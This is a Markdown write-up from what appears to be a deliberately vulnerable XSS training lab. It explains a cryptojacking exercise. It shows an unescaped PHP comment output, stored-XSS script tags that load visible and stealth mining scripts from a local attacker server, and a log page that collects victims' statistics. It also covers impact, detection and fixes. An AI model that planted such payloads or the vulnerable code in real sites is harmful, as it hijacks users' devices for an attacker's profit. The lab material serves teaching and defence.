# Cryptojacking Vulnerability

This document explains the cryptojacking vulnerability that has been added to the XSS lab.

## What is Cryptojacking?

Cryptojacking is a type of cyberattack where attackers secretly use a victim's computing resources to mine cryptocurrency. This is done by running JavaScript code in the victim's browser that performs the computationally intensive work of cryptocurrency mining.

## How the Vulnerability Works

In our vulnerable application, we have a comment system that does not properly sanitize user input. This allows attackers to inject malicious JavaScript code that will be executed in the browsers of other users who view the comments.

The vulnerability exists in `index.php` where comment content is displayed without proper sanitization:

```php
// Intentionally vulnerable to XSS
echo "<p>" . $row['content'] . "</p>";
```

Instead of using `htmlspecialchars()` to escape HTML entities, the application directly outputs the raw content, allowing JavaScript to be executed.

## The Attack Payload

An attacker can post a comment containing JavaScript that loads and executes the cryptomining script:

```html
<script src="http://localhost:8081/miner.js"></script>
```

When other users view the page with this comment, their browsers will load and execute the mining script, which will:

1. Start consuming CPU resources to perform mining calculations
2. Display a small UI element showing mining statistics (for the basic miner)
3. Periodically report mining statistics back to the attacker's server

For a more stealthy approach, attackers can use the stealth miner:

```html
<script src="http://localhost:8081/stealth_miner.js"></script>
```

The stealth miner operates without any visible UI and adapts its mining intensity based on user activity to avoid detection.

## Impact of the Attack

The impact of this attack includes:

1. **Resource Consumption**: Victims' devices will experience increased CPU usage, leading to:
   - Reduced battery life on mobile devices
   - System slowdowns
   - Increased power consumption
   - Potential overheating

2. **Financial Impact**: The attacker profits from the cryptocurrency mined using the victims' resources.

3. **User Experience Degradation**: The website becomes slower and less responsive for victims.

## Detecting the Attack

Users might notice:
- Unexplained high CPU usage
- Device running hotter than normal
- Battery draining faster than usual
- Browser performance degradation
- Unusual network requests to unknown domains

## Prevention Measures

To prevent this vulnerability:

1. **Input Sanitization**: Always sanitize user input before displaying it:
   ```php
   echo "<p>" . htmlspecialchars($row['content']) . "</p>";
   ```

2. **Content Security Policy (CSP)**: Implement a strict CSP that prevents execution of unauthorized scripts:
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'
   ```

3. **Output Encoding**: Ensure all dynamic content is properly encoded for the context it appears in.

4. **Regular Security Audits**: Regularly review code for security vulnerabilities.

## Lab Exercise

To demonstrate this vulnerability:

1. Log in to the vulnerable application
2. Post a comment with one of the following payloads:
   ```html
   <!-- Basic miner (visible UI) -->
   <script src="http://localhost:8081/miner.js"></script>
   
   <!-- Stealth miner (completely hidden) -->
   <script src="http://localhost:8081/stealth_miner.js"></script>
   ```
3. Log in as another user and view the comments
4. Observe the mining activity in the browser (CPU usage increase, mining UI for basic miner)
5. Visit `http://localhost:8081/mining_logs.php` to see the collected mining statistics

## Ethical Considerations

This lab is for educational purposes only. In real-world scenarios:
- Cryptojacking is illegal and unethical
- It violates users' trust and consumes their resources without consent
- It can cause damage to hardware through excessive resource usage

Always obtain proper authorization before security testing and never deploy cryptojacking scripts on production systems or against real users. 